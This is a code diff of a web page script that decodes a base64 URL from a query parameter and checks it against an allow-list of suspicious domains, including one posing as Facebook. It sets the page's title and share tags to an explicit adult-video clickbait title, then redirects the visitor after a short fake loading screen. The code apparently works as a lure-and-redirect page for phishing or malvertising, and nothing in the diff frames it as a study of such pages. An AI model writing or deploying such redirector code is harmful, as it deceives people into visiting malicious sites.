@@ -87,40 +87,51 @@
 </div>
 
 <script>
-  (function () {
-    const params = new URLSearchParams(window.location.search);
-    const encoded = params.get('key');
+(function () {
+  const params = new URLSearchParams(window.location.search);
+  const encoded = params.get('key');
 
-    if (!encoded) return;
-xpweyurt.eu.org
-    try {
-      const decodedUrl = atob(encoded.trim());
-      const allowedDomains = ['appstalker-fb.eu.org', 'appstalker-fb.eu.org', 'abnormalitylovingmammal.com', 'otieu.com', 'pwcenter.eu.org'];
-      const urlObj = new URL(decodedUrl);
-      const host = urlObj.hostname;
+  if (!encoded) return;
 
-      const isAllowed = allowedDomains.some(domain => host.includes(domain));
+  try {
+    const decodedUrl = atob(encoded.trim());
+    const urlObj = new URL(decodedUrl);
+    const host = urlObj.hostname;
 
-      if (isAllowed) {
-        document.getElementById('meta-title').innerText = 'Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]';
-        document.getElementById('meta-desc').setAttribute('content', 'Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]');
-        document.getElementById('og-title').setAttribute('content', 'Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]');
-        document.getElementById('og-desc').setAttribute('content', 'Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]');
+    const allowedDomains = [
+      'appstalker-fb.eu.org',
+      'abnormalitylovingmammal.com',
+      'otieu.com',
+      'pwcenter.eu.org'
+    ];
 
-        document.getElementById("errorPage").style.display = "none";
-        document.getElementById("loader").style.display = "flex";
+    const isAllowed = allowedDomains.some(domain => host.includes(domain));
 
-        setTimeout(() => {
-          window.location.href = decodedUrl;
-        }, 1200);
-      } else {
-        console.warn('Redirect canceled: domain not allowed.');
-      }
-    } catch (err) {
-      console.error('Invalid URL:', err);
+    if (isAllowed) {
+      
+      const customTitle = "Watch AV導演_恩凱Enkai หาทั้งวันเกือบได้ฟันสาวมีหำ [ซาน]";
+      document.getElementById('meta-title').innerText = customTitle;
+      document.getElementById('meta-desc').setAttribute('content', customTitle);
+      document.getElementById('og-title').setAttribute('content', customTitle);
+      document.getElementById('og-desc').setAttribute('content', customTitle);
+
+      
+      document.getElementById("errorPage").style.display = "none";
+      document.getElementById("loader").style.display = "flex";
+
+      
+      setTimeout(() => {
+        window.location.href = decodedUrl;
+      }, 1200);
+    } else {
+      console.warn('Redirect dibatalkan: domain tidak diizinkan.');
     }
-  })();
+  } catch (err) {
+    console.error('Gagal decode atau URL tidak valid:', err);
+  }
+})();
 </script>
+
 <script>
 	document.addEventListener("DOMContentLoaded", function () {
   const images = document.querySelectorAll('img:not([loading])');
